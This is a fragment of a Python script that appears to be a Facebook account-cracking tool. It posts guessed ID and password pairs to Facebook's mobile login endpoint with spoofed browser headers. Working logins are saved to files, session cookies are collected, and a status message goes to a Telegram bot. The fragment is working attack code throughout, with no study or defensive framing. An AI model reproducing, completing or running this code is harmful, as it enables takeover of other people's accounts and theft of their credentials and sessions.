'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			heade = {
'Host':'x.facebook.com',
'x-fb-rlafr': '0',
'access-control-allow-origin': '*',
'pragma': 'no-cache',
'cache-control': 'private, no-cache, no-store, must-revalidate',
'x-fb-lsd':'AVqUJPZ_4-8',
'x-fb-asbd-id':'198387',
'x-fb-debug':'Ar808puA9haE5G4ec9zVAcFGinnes6bGoqixLonN/y5Q6rn9EcYoI4u3yLxGxJDpKRXuHAOiLuDHUPAeSTdPtg==',
'content-length':'2052',
'cache-control': 'max-age=0',
'save-data': 'on',
'upgrade-insecure-requests':'1',
'strict-transport-security':'max-age=15552000; preload',
'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
'sec-ch-ua-mobile':'?1',
'user-agent':ua,
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': 'https://x.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer':'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
'accept-encoding':'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'
}
			po = ses.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=heade)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold red]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				requests.get("https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(40)
	loop+=9

#-----------------------[ NADER ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('SENA OK🤑') 
	except:pass
	try:os.mkdir('SENA CP😒')
	except:pass
	try:os.mkdir('/sdcard/BrayennnXD')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()